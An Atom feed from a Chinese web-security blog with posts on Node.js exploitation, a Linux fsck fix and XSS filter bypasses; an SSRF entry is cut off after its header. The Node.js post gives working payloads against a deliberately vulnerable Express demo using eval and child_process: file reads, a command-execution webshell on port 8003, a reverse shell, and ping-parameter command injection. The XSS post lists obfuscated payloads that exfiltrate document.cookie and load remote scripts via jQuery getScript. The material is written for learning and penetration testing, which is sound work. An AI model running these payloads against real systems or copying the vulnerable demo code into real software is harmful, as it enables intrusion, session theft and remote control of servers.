<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Boogle&#39;s Blog</title>
  
  <subtitle>没有网络安全，就没有国家安全</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://zhengbao.wang/"/>
  <updated>2019-08-07T08:38:22.391Z</updated>
  <id>https://zhengbao.wang/</id>
  
  <author>
    <name>boogle</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Nodejs安全</title>
    <link href="https://zhengbao.wang/Nodejs%E5%AE%89%E5%85%A8/"/>
    <id>https://zhengbao.wang/Nodejs安全/</id>
    <published>2019-08-07T06:53:18.000Z</published>
    <updated>2019-08-07T08:38:22.391Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。Node 是一个让 JavaScript 运行在服务端的开发平台，它让 JavaScript 成为与PHP、Python、Perl、Ruby 等服务端语言平起平坐的脚本语言。因为在之前并没有了解过nodejs的所产生的安全问题，本文将以node.js框架<code>express</code>为例，浅析nodejs安全问题。</p><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>本次测试使用express框架，环境搭建很简单，只需新建一个工作目录，然后执行<code>npm install expres –save</code>,即可使用<code>express</code>。<br>演示代码如下<code>test.js</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">var</span> resp=<span class="built_in">eval</span>(<span class="string">"("</span>+req.query.input+<span class="string">")"</span>);</span><br><span class="line"> res.send(<span class="string">'Output&lt;/br&gt;'</span>+resp);</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(<span class="number">8001</span>);</span><br></pre></td></tr></table></figure></p><p>然后执行<code>node test.js</code>即可在本地<code>8001</code>端口启动一个简单的web应用程序。<br><img src="https://i.loli.net/2019/07/12/5d2882fb3610d56344.png" alt></p><h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h2><p>在渗透测试过程种，对目标的渗透必要要经过信息收集以获取更过的信息来定制下一步的行动计划。对Node.js应用的渗透也要经过信息收集，以确定目标是否使用了Node.js。收集过程中重点留意cookies， name[“connect.sid”]，server以及 X-powered-By 等头信息。如在前面搭建起的环境种，<code>X-powered-By</code>头暴露了目标使用<code>express</code>框架。<br><img src="https://i.loli.net/2019/07/12/5d28846f8727a76819.png" alt><br>此外，程序运行时意外的报错信息也能帮助获取更多的信息，当然，一个大型的项目很少会出现这种报错。<br>但在上面的demo中，输入的input中带有一些特殊字符时将触发报错。<br><img src="https://i.loli.net/2019/07/12/5d28865b486e137355.png" alt><br>在得知目标为<code>Node.js</code>应用后，便可以进行进一步的利用。</p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><h3 id="服务端代码执行"><a href="#服务端代码执行" class="headerlink" title="服务端代码执行"></a>服务端代码执行</h3><p>在前面的demo中，通过get传入的参数未经任何过滤而直接进入到<code>eval()</code>函数中执行，此处便存在代码执行漏洞。<br>下面是可以用于测试的一些payload</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">process</span>.arch</span><br><span class="line"><span class="built_in">process</span>.argv</span><br><span class="line"><span class="built_in">process</span>.argv0</span><br><span class="line"><span class="built_in">process</span>.channel</span><br><span class="line"><span class="built_in">process</span>.cwd()</span><br><span class="line"><span class="built_in">process</span>.geteuid()</span><br><span class="line"><span class="built_in">process</span>.getegid()</span><br><span class="line"><span class="built_in">process</span>.pid</span><br><span class="line"><span class="built_in">process</span>.<span class="built_in">platform</span></span><br><span class="line"><span class="built_in">process</span>.<span class="built_in">version</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/12/5d2888947cf8370728.png" alt><br>甚至可以传入<code>process.exit()</code>终止程序的运行。<br><img src="https://i.loli.net/2019/07/12/5d28894f0822b82705.png" alt></p><p>读取文件<code>require(&#39;fs&#39;).readFileSync(&#39;test.js&#39;).toString()</code><br><img src="https://i.loli.net/2019/07/12/5d2889c16bdee95884.png" alt></p><p>获取webshell<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span></span> &#123; <span class="built_in">require</span>(<span class="string">'http'</span>).createServer(<span class="function"><span class="keyword">function</span> <span class="params">(req, res)</span></span> &#123; res.writeHead(<span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/plain"</span>&#125;);<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="built_in">require</span>(<span class="string">'url'</span>).parse(req.url, <span class="literal">true</span>).query[<span class="string">'cmd'</span>], <span class="function"><span class="keyword">function</span><span class="params">(e,s,st)</span></span> &#123;res.<span class="keyword">end</span>(s);&#125;); &#125;).listen(<span class="number">8003</span>); &#125;, <span class="number">3000</span>)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/07/16/5d2d2ea8632f956229.png" alt><br>这里传入<code>setTimeout</code>函数，三秒后在8003端口启动一个webshell。(延时时间最好大于1s，否则可能执行失败)<br><img src="https://i.loli.net/2019/07/16/5d2d2e91221c876341.png" alt><br>成功执行命令，可以看到<code>setTimeout</code>也可以执行任意代码，所以会任何进入系统函数的用户输入都是不安全的，在测试过程不仅要注意<code>eval</code>函数，还要注意<code>setTimeuut</code> <code>setInterval</code>等系统函数。</p><p>获取反弹shell<br>payload<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rev</span>(<span class="params">host,port</span>)</span>&#123;<span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);<span class="keyword">var</span> cp  = <span class="built_in">require</span>(<span class="string">'child_process'</span>);<span class="keyword">var</span> cmd = cp.spawn(<span class="string">'cmd.exe'</span>, []);<span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();client.connect(port, host, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;client.write(<span class="string">'Connected\r\n'</span>); client.pipe(cmd.stdin); cmd.stdout.pipe(client);cmd.stderr.pipe(client);client.on(<span class="string">'exit'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">code,signal</span>)</span>&#123; client.end(<span class="string">'Disconnected\r\n'</span>); &#125; );client.on( <span class="string">'error'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123; setTimeout( rev(host,port), <span class="number">5000</span>); &#125;)&#125;);&#125;;rev(<span class="string">'127.0.0.1'</span>, <span class="number">1234</span>);</span><br></pre></td></tr></table></figure></p><p>这里也可使用<a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py" target="_blank" rel="noopener">nodejsshell.py</a>生成编码后的nodejs代码<br>输入监听的ip 端口<br><img src="https://i.loli.net/2019/07/16/5d2d38593d54c25929.png" alt><br>执行生成的payload<br><img src="https://i.loli.net/2019/07/16/5d2d38a07e94893643.png" alt><br>nc成功监听到返回的shell<br><img src="https://i.loli.net/2019/07/16/5d2d38dc0856c30683.png" alt><br>目标为Linux主机可以返回<code>/bin/bash</code>,windows下可以返回<code>cmd.exe</code>，可以在生成代码的第36行进行修改<br><img src="https://i.loli.net/2019/07/16/5d2d39482974b24029.png" alt></p><h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><p><code>Node.js</code>的远程命令执行主要是由于没有正确使用<code>child_process</code>模块造成的，该模块可以创建一个新的进程进来执行系统命令。<br><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="built_in">url</span> = <span class="built_in">require</span>(<span class="string">"url"</span>);</span><br><span class="line"><span class="keyword">var</span> exe = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">request, response</span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> parsedUrl = <span class="built_in">url</span>.parse(request.url, <span class="literal">true</span>);</span><br><span class="line">  response.writeHead(<span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/html"</span>&#125;);</span><br><span class="line">  exe.exec(<span class="string">'ping -c 2 '</span> + parsedUrl.query.ping, <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">  response.write(<span class="string">"Hello "</span>+ data);</span><br><span class="line">  response.end();</span><br><span class="line">  &#125;);</span><br><span class="line">  </span><br><span class="line">&#125;).listen(<span class="number">8888</span>);</span><br></pre></td></tr></table></figure></p><p>上面的demo中使用了<code>child_process</code>模块的exec函数来进行系统交互来执行<code>ping</code>命令。但是由于没有正确过滤传入的参数，从而造成任意系统命令执行。<br>正常服务<br><img src="https://i.loli.net/2019/08/07/9Py6NVuzFOjYB5l.png" alt><br>执行任意命令<br><code>http://127.0.0.1:8888/?ping=www.baidu.com;||dir</code><br><img src="https://i.loli.net/2019/08/07/ygQtSMiX3JIWldn.png" alt></p><h3 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h3><p>这是<code>Node.js</code>一个比较独特的特性，允许一个参数有多个值传入，当对一个参数传入多个值时，中间会以逗号<code>,</code>进行拼接。<br>比如上面的demo中，我们传入两个ping值<br><img src="https://i.loli.net/2019/08/07/yxjezVQbuZApCcK.png" alt><br>这个特性可能会引起参数解析漏洞或者在绕过waf时提供思路。</p><h2 id="0x04-防护"><a href="#0x04-防护" class="headerlink" title="0x04 防护"></a>0x04 防护</h2><p>在给出的<code>Node.js</code>不安全的demo中，可以明显的看出，同其他语言一样，所有未加过滤的用输入都是不安全的，所以在开发过程中应时刻注意对用户输入做适当的处理，令附node.js安全开发的一些参考<a href="https://www.cnblogs.com/qingmingsang/articles/10397870.html" target="_blank" rel="noopener">https://www.cnblogs.com/qingmingsang/articles/10397870.html</a></p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://bbs.ichunqiu.com/thread-24807-1-1.html?from=beef" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-24807-1-1.html</a><br><a href="https://www.jianshu.com/p/8253adac33d8" target="_blank" rel="noopener">https://www.jianshu.com/p/8253adac33d8</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。Node 是
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Nodejs" scheme="https://zhengbao.wang/tags/Nodejs/"/>
    
  </entry>
  
  <entry>
    <title>Linux run fsck failed问题解决办法</title>
    <link href="https://zhengbao.wang/Linux-run-fsck-failed%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    <id>https://zhengbao.wang/Linux-run-fsck-failed问题解决办法/</id>
    <published>2019-06-19T13:47:43.000Z</published>
    <updated>2019-06-19T13:49:44.908Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前课程设计内容保存在reahat虚拟机里了，最近要进行答辩，打开虚拟机一看竟然启动失败。<br>心咯噔一下，仔细看一下幸好不是大问题，仅此小记，以备不时之需。</p><h2 id="0x01-问题"><a href="#0x01-问题" class="headerlink" title="0x01 问题"></a>0x01 问题</h2><p><img src="https://i.loli.net/2019/06/19/5d0a3afe4241917700.png" alt><br>从截图中可以看到启动失败的问题为<code>RUN fsck manuplly failed</code><br>看样子应该是硬盘出现了啥问题，导致开启时分区挂载不上，然后修复失败。</p><p>好在下面给了个手动修复的命令行，只要输入<code>root password</code>即可登陆</p><h2 id="0x02-解决"><a href="#0x02-解决" class="headerlink" title="0x02 解决"></a>0x02 解决</h2><p>既然时自动修复失败，那么便手动修复一下试试。<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fsck -y <span class="regexp">/dev/m</span>apper<span class="regexp">/VolGroup-lv_root</span></span><br></pre></td></tr></table></figure></p><p>这里<code>/dev/mapper/VolGroup-lv_root</code>修复路径为上面修复失败的路径<br>修复后如下图，<code>reboot</code>重启应该就没啥问题了。<br><img src="https://i.loli.net/2019/06/19/5d0a3c43ebfdb22919.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;之前课程设计内容保存在reahat虚拟机里了，最近要进行答辩，打开虚拟机一看竟然启动失败。&lt;br&gt;心
      
    
    </summary>
    
      <category term="环境配置" scheme="https://zhengbao.wang/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="Linux错误" scheme="https://zhengbao.wang/tags/Linux%E9%94%99%E8%AF%AF/"/>
    
  </entry>
  
  <entry>
    <title>XSS姿势学习</title>
    <link href="https://zhengbao.wang/XSS%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/"/>
    <id>https://zhengbao.wang/XSS姿势学习/</id>
    <published>2019-06-17T13:24:21.000Z</published>
    <updated>2019-06-18T11:14:01.428Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间看到了<a href="https://nosec.org/home/detail/2654.html" target="_blank" rel="noopener">无需括号和分号的XSS</a>,最近又看了<a href="https://www.anquanke.com/post/id/180187" target="_blank" rel="noopener">利用JavaScript全局变量绕过XSS过滤器</a>,两篇均为译文，提出了一些非常有用的姿势，特此记录膜拜。另外文末贴有原文连接。</p><h2 id="0x01-无需括号和分号的XSS"><a href="#0x01-无需括号和分号的XSS" class="headerlink" title="0x01 无需括号和分号的XSS"></a>0x01 无需括号和分号的XSS</h2><p>早在几年前，作者就提到过在javascript中调用函数而无需括号的方法<br><code>&lt;script&gt;onerror=alert;throw 1337&lt;/script&gt;</code><br>该方法主要利用<code>onerror</code>和<code>throw</code>,工作原理是将onerror设置为你想调用的函数，然后用throw语句将参数传递给调用函数。在上面的payload中，因为throw是一个语句，在和onerror配合使用时需要用分号隔离，避免被包含。而语句隔离也可以使用花括号<code>{}</code>来实现:<br><code>&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;</code><br>这样其实就已经达到作者标题所要的无需括号和分号的xss。<br>但是作者并没有停止，很快又提出了一万种姿势。<br>他发现<code>throw</code>语句可以接上一些表达式，那么这样就可以把<code>onerror</code>放在<code>throw</code>语句中进行赋值，并且throw表达式的<code>最后一部分</code>会被发送到onerror指定的处理函数中。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="keyword">throw</span> onerror=alert,a=<span class="string">'boogle'</span>,b=<span class="string">'1337'</span>,a</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/17/5d0712192c7ed21268.png" alt></p><p>如果想执行更复杂的语句，那么便可以使用<code>eval</code>函数，但是将上面的payload改为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">throw</span> onerror=<span class="built_in">eval</span>,alert<span class="string">`xss`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>这里弹出的xss为一个字符串，可以使用破浪号包裹而不用括号，如果想要弹cookie，那么就要用到括号了<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">throw</span> onerror=<span class="built_in">eval</span>,alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>这种方式调用函数，那么显然还是需要<code>()</code>的。但是仔细观察前面的弹窗，我们传入内容为<code>boogle</code>,弹窗内容却为<code>Uncaught boogle</code><br>这样如果在传入的内容之前添加一个<code>=</code>,将会产生一个什么样的效果。<br>对，神奇的事情发生了，就像表面添加<code>=</code>一样，可以将<code>Uncaught</code>赋值为后面的内容，成为一个变量，那么这个变量就可以传入<code>eval</code>函数执行任意javascript代码了。<br>下面的payload中因为alert函数被引号包裹，可以将<code>()</code>编码为<code>\x28\x29</code>从而达到绕过效果。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">throw</span>%<span class="number">20</span>onerror=<span class="built_in">eval</span>,<span class="string">"=alert\x28document.cookie\x29"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/17/5d077bc55e02d71577.png" alt><br>同样，前面的payload也可以这样变种,产生的效果及原理相同.<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&#123;onerror=<span class="built_in">eval</span>&#125;<span class="keyword">throw</span><span class="string">'=alert\x281337\x29'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>上面将<code>Uncaught</code>变为变量的方法是在<code>chrome</code>浏览器下实现的，而且在<code>Microsoft Edge</code>和<code>IE</code>下都能达到效果。但是当把这种方法拿到<code>firefox</code>浏览器时，却失败了，原因Firefox种报错前缀是<code>uncaught exception:</code>，代码最后执行赋值时会出现语法错误。<br><img src="https://i.loli.net/2019/06/17/5d077f0e2616657672.png" alt></p><p>但是很快作者给出了在<code>firefox</code>上的任意javascript执行的方法<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&#123;onerror=<span class="built_in">eval</span>&#125;<span class="keyword">throw</span>&#123;<span class="attr">lineNumber</span>:<span class="number">1</span>,<span class="attr">columnNumber</span>:<span class="number">1</span>,<span class="attr">fileName</span>:<span class="number">1</span>,<span class="attr">message</span>:<span class="string">'alert\x281\x29'</span>&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>`</span><br></pre></td></tr></table></figure></p><p>最终，作者更是贴出了一种无需字符串的通用payload</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">throw</span>/a/,Uncaught=<span class="number">1</span>,g=alert,a=URL%<span class="number">2b0</span>,onerror=<span class="built_in">eval</span>,/<span class="number">1</span>/g%2ba[<span class="number">12</span>]%2b[<span class="number">1337</span>]%2ba[<span class="number">13</span>]&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以看到，在该payloa中，作者非常巧妙的利用<code>a=URL+0</code>的方式将<code>function</code>与字符相加变为字符串，即a为<code>&quot;function URL() { [native code] }0&quot;</code>，然后从<code>a</code>取相应的字符使用。利用这种方式去拼接被过滤的关键词的确为一种很好的思路。<br><img src="https://i.loli.net/2019/06/17/5d078b1d0b5d277669.png" alt></p><p>还有通过使用类型错误自动将字符串发送到异常处理程序的方法，这使得我们完全不需要throw语句。<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span>TypeError.prototype.name ='=/',0[<span class="string">onerror=eval</span>][<span class="symbol">'/-alert(1)//'</span>]<span class="xml"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><h2 id="0x02-利用JavaScript全局变量绕过XSS过滤器"><a href="#0x02-利用JavaScript全局变量绕过XSS过滤器" class="headerlink" title="0x02 利用JavaScript全局变量绕过XSS过滤器"></a>0x02 利用JavaScript全局变量绕过XSS过滤器</h2><p>这里所说的javascript全局变量是指利用<code>self</code>或者<code>window</code>调用任意javascript代码。<br><img src="https://i.loli.net/2019/06/17/5d078da09539397951.png" alt><br>比如说调用<code>alert</code>方法，可以使用<code>self[&quot;alert&quot;]</code><br><img src="https://i.loli.net/2019/06/17/5d078e1fe3a7988325.png" alt><br>如果alert关键词被过滤，使用全局变量的方法甚至可以使用字符串拼接<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span>self[<span class="string">"al"+"ert"</span>](<span class="link">1</span>)<span class="xml"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>同样因为是在字符串中，可以使用十六进制编码、base64编码等<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/*</span><br><span class="line">** alert(document.cookie)</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">self["<span class="symbol">\x</span>61<span class="symbol">\x</span>6c<span class="symbol">\x</span>65<span class="symbol">\x</span>72<span class="symbol">\x</span>74"](</span><br><span class="line">    self["<span class="symbol">\x</span>64<span class="symbol">\x</span>6f<span class="symbol">\x</span>63<span class="symbol">\x</span>75<span class="symbol">\x</span>6d<span class="symbol">\x</span>65<span class="symbol">\x</span>6e<span class="symbol">\x</span>74"]</span><br><span class="line">        ["<span class="symbol">\x</span>63<span class="symbol">\x</span>6f<span class="symbol">\x</span>6f<span class="symbol">\x</span>6b<span class="symbol">\x</span>69<span class="symbol">\x</span>65"]</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>另外，网站中如果使用了jQuery之类的第三方库。可以利用这些第三方库中的全局变量<br>比如在JQuery中<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">self[<span class="string">"$"</span>][<span class="symbol">"globalEval"</span>]("alert(1)");</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">self[<span class="string">"\x24"</span>][<span class="symbol">"\x67\x6c\x6f\x62\x61\x6c\x45\x76\x61\x6c"</span>]</span><br><span class="line">("\x61\x6c\x65\x72\x74\x28\x31\x29");</span><br></pre></td></tr></table></figure></p><p>甚至可以使用<code>self[&quot;$&quot;][&quot;getScript&quot;](url)</code>来加载任意js文件<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self[<span class="string">"$"</span>][<span class="symbol">"getScript"</span>]("https://example.com/my.js");</span><br></pre></td></tr></table></figure></p><p>另外还可以使用javascript迭代器<code>Object.keys</code>和正则表达式的方法去获取指定函数。<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a = function() &#123;</span><br><span class="line">    <span class="built_in">c</span>=<span class="number">0</span>; <span class="comment">// index counter</span></span><br><span class="line">    <span class="keyword">for</span>(i <span class="keyword">in</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(/^a[rel]+t$/.test(i)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">c</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">c</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// in one line</span></span><br><span class="line">a=()=&gt;&#123;<span class="built_in">c</span>=<span class="number">0</span>;<span class="keyword">for</span>(i <span class="keyword">in</span> <span class="keyword">self</span>)&#123;<span class="keyword">if</span>(/^a[rel]+t$/.test(i))&#123;<span class="keyword">return</span> <span class="built_in">c</span>&#125;<span class="built_in">c</span>++&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// then you can use a() with Object.keys</span></span><br><span class="line"><span class="comment">// alert("foo")</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">self</span>[<span class="type">Object</span>.keys(<span class="keyword">self</span>)[a()]](<span class="string">"foo"</span>)</span><br></pre></td></tr></table></figure></p><p>使用这些方法，可以说可以在很大程度上绕过一些检测关键字黑名单的waf了。</p><p>如果与第一种方法相结合，更是可以组合出更有效的payload<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span>throw/a/,Uncaught=1,g=alert,a=URL%2b0,self[<span class="string">`on`%2b`error`</span>]=eval,/1/g%2ba[<span class="string">12</span>]%2b"self[<span class="string">`document`</span>][<span class="symbol">`cookie`</span>]"%2ba[13]<span class="xml"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span>TypeError.prototype.name="=/",0[<span class="string">self[`on`%2b`error`</span>]=self[<span class="string">"eval"</span>]][<span class="string">"/-self[`alert`</span>](<span class="link">self[`document`][`cookie`]</span>)//"]<span class="xml"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="https://portswigger.net/blog/xss-without-parentheses-and-semi-colons" target="_blank" rel="noopener">https://portswigger.net/blog/xss-without-parentheses-and-semi-colons</a><br><a href="https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/" target="_blank" rel="noopener">https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;前段时间看到了&lt;a href=&quot;https://nosec.org/home/detail/2654
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xss" scheme="https://zhengbao.wang/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>SSRF的一些利用姿势</title>
    <link href="https://zhengbao.wang/SSRF%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/"/>
    <id>https://zhengbao.wang/SSRF的一些利用姿势/</id>
    <published>2019-05-06T13:33:14.000Z</published>
